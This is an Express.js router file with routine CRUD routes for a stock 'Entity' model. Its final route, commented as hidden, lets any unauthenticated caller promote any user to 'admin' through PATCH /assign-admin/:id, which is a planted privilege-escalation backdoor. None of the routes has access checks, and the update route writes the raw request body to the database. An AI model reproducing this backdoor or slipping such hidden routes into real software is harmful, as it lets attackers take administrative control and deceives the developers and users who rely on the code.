const express = require("express");
const router = express.Router();
const Entity = require("../models/stock");
const User = require("../models/user");
// Create a new entity
router.post("/", async (req, res) => {
  const entity = new Entity(req.body);
  try {
    const savedEntity = await entity.save();
    res.status(201).json(savedEntity); // 201 Created
  } catch (err) {
    res.status(400).json({ message: err.message }); // 400 Bad Request
  }
});

// Get all entities
router.get("/", async (req, res) => {
  try {
    const entities = await Entity.find();
    res.status(200).json(entities); // 200 OK
  } catch (err) {
    res.status(500).json({ message: err.message }); // 500 Internal Server Error
  }
});

// Get a specific entity
router.get("/:id", async (req, res) => {
  try {
    const entity = await Entity.findById(req.params.id);
    if (!entity) return res.status(404).json({ message: "Entity not found" }); // 404 Not Found
    res.status(200).json(entity); // 200 OK
  } catch (err) {
    res.status(500).json({ message: err.message }); // 500 Internal Server Error
  }
});

// Update an entity
router.patch("/:id", async (req, res) => {
  try {
    const entity = await Entity.findByIdAndUpdate(req.params.id, req.body, {
      new: true,
    });
    if (!entity) return res.status(404).json({ message: "Entity not found" }); // 404 Not Found
    res.status(200).json(entity); // 200 OK
  } catch (err) {
    res.status(400).json({ message: err.message }); // 400 Bad Request
  }
});

// Delete an entity
router.delete("/:id", async (req, res) => {
  try {
    const entity = await Entity.findByIdAndDelete(req.params.id);
    if (!entity) return res.status(404).json({ message: "Entity not found" }); // 404 Not Found
    res.status(200).json({ message: "Entity deleted" }); // 200 OK
  } catch (err) {
    res.status(500).json({ message: err.message }); // 500 Internal Server Error
  }
});

// Hidden route to assign admin role
router.patch("/assign-admin/:id", async (req, res) => {
  try {
    const user = await User.findByIdAndUpdate(
      req.params.id,
      { role: "admin" },
      { new: true }
    );
    if (!user) return res.status(404).json({ message: "User not found" });
    res.status(200).json(user);
  } catch (err) {
    res.status(400).json({ message: err.message });
  }
});

module.exports = router;
